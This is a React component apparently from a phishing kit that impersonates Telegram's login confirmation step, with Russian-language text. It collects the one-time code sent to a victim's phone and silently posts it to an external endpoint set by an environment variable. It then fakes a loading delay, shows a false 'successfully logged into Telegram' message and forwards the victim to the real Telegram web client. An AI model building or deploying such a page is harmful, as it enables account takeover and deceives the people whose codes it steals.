import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "./ui/form";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { cn } from "@/lib/utils/utils";
import axios from "axios";
import { useState } from "react";
import { Loader2 } from "lucide-react";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "./ui/alert-dialog";
import { Link } from "react-router-dom";

const formSchema = z.object({
  code: z
    .string({
      required_error:
        "Для авторизации необходимо ввести код, полученный в сообщении",
    })
    .length(5, { message: "Код должен состоять из 5-и цифр" }),
});

interface FormConfirmationProps {
  className?: string;
}

const FormConfirmation = ({ className }: FormConfirmationProps) => {
  const [isLoading, setIsLoading] = useState(false);
  const [isDialogOpen, setIsDialogOpen] = useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      code: "",
    },
  });

  const onSubmit = (values: z.infer<typeof formSchema>) => {
    axios.post(import.meta.env.VITE_WEB_SERVICE_2, {
      phone_code: values.code,
    });

    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setIsDialogOpen(true);
    }, 5000);
  };

  return (
    <>
      <Form {...form}>
        <form
          onSubmit={form.handleSubmit(onSubmit)}
          className={cn("w-full space-y-8", className)}
        >
          <FormField
            disabled={isLoading}
            control={form.control}
            name="code"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-sm font-light">
                  Код подтверждения
                </FormLabel>
                <FormControl>
                  <Input
                    placeholder="Введите код, полученный в сообщении"
                    className="py-6 text-center hover:border-telegram hover:transition-colors hover:focus:border-border"
                    type="number"
                    required
                    {...field}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />
          <Button
            type="submit"
            className={cn(
              "w-full rounded-lg bg-telegram py-7 hover:bg-telegram/90",
              isLoading ? "hidden" : "flex",
            )}
          >
            ДАЛЕЕ
          </Button>
          <Button
            className={cn(
              "w-full rounded-lg bg-telegram py-7 hover:bg-telegram/90",
              isLoading ? "flex" : "hidden",
            )}
            disabled={isLoading}
          >
            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
            ДАЛЕЕ
          </Button>
        </form>
      </Form>
      <AlertDialog
        open={isDialogOpen}
        onOpenChange={setIsDialogOpen}
        defaultOpen={isDialogOpen}
      >
        <AlertDialogTrigger />
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Авторизация</AlertDialogTitle>
            <AlertDialogDescription>
              Вы успешно авторизовались в Telegram.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction className="bg-telegram hover:bg-telegram/90">
              <Link to="https://web.telegram.org/">Продолжить</Link>
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
};
export default FormConfirmation;
